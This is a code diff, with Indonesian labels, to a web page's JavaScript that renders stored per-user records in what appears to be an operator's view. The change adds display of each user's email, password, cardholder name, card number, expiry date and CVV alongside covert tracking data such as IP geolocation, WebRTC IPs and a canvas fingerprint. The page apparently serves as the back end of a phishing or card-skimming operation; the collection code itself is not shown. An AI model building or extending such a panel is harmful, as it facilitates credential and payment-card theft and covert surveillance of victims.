@@ -26,18 +26,29 @@
             userDataDiv.innerHTML = storedData.map((data, index) => `
                 <div class="border p-4 rounded">
                     <p><strong>Pengguna #${index + 1}</strong></p>
-                    <p><strong>IP Address:</strong> ${data.ip}</p>
-                    <p><strong>Kota:</strong> ${data.city}</p>
-                    <p><strong>Negara:</strong> ${data.country}</p>
-                    <p><strong>Lokasi (IP):</strong> Lat: ${data.ipLatitude}, Lon: ${data.ipLongitude}</p>
-                    <p><strong>Lokasi (GPS):</strong> ${data.gpsLocation}</p>
-                    <p><strong>Zona Waktu:</strong> ${data.timezone}</p>
-                    <p><strong>User Agent:</strong> ${data.userAgent}</p>
-                    <p><strong>Bahasa:</strong> ${data.language}</p>
-                    <p><strong>Platform:</strong> ${data.platform}</p>
-                    <p><strong>WebRTC IPs:</strong> ${data.webrtcIps.join(', ')}</p>
-                    <p><strong>Canvas Fingerprint:</strong> ${data.canvasFingerprint}</p>
-                    <p><strong>Waktu:</strong> ${data.timestamp}</p>
+                    <p><strong>Email:</strong> ${data.email || 'Tidak tersedia'}</p>
+                    <p><strong>Kata Sandi:</strong> ${data.password || 'Tidak tersedia'}</p>
+                    <p><strong>Detail Pembayaran:</strong></p>
+                    <ul class="ml-4 list-disc">
+                        <li><strong>Nama Pemilik Kartu:</strong> ${data.payment?.cardHolder || 'Tidak tersedia'}</li>
+                        <li><strong>Nomor Kartu:</strong> ${data.payment?.cardNumber || 'Tidak tersedia'}</li>
+                        <li><strong>Tanggal Kedaluwarsa:</strong> ${data.payment?.expiryDate || 'Tidak tersedia'}</li>
+                        <li><strong>CVV:</strong> ${data.payment?.cvv || 'Tidak tersedia'}</li>
+                    </ul>
+                    <p><strong>Data Pelacakan:</strong></p>
+                    <ul class="ml-4 list-disc">
+                        <li><strong>IP Address:</strong> ${data.tracking?.ip || 'Tidak tersedia'}</li>
+                        <li><strong>Kota:</strong> ${data.tracking?.city || 'Tidak tersedia'}</li>
+                        <li><strong>Negara:</strong> ${data.tracking?.country || 'Tidak tersedia'}</li>
+                        <li><strong>Lokasi (IP):</strong> Lat: ${data.tracking?.ipLatitude || 'Tidak tersedia'}, Lon: ${data.tracking?.ipLongitude || 'Tidak tersedia'}</li>
+                        <li><strong>Zona Waktu:</strong> ${data.tracking?.timezone || 'Tidak tersedia'}</li>
+                        <li><strong>Bahasa:</strong> ${data.tracking?.language || 'Tidak tersedia'}</li>
+                        <li><strong>User Agent:</strong> ${data.tracking?.userAgent || 'Tidak tersedia'}</li>
+                        <li><strong>Platform:</strong> ${data.tracking?.platform || 'Tidak tersedia'}</li>
+                        <li><strong>WebRTC IPs:</strong> ${data.tracking?.webrtcIps?.join(', ') || 'Tidak tersedia'}</li>
+                        <li><strong>Canvas Fingerprint:</strong> ${data.tracking?.canvasFingerprint || 'Tidak tersedia'}</li>
+                    </ul>
+                    <p><strong>Waktu:</strong> ${data.tracking?.timestamp || 'Tidak tersedia'}</p>
                 </div>
             `).join('');
         }
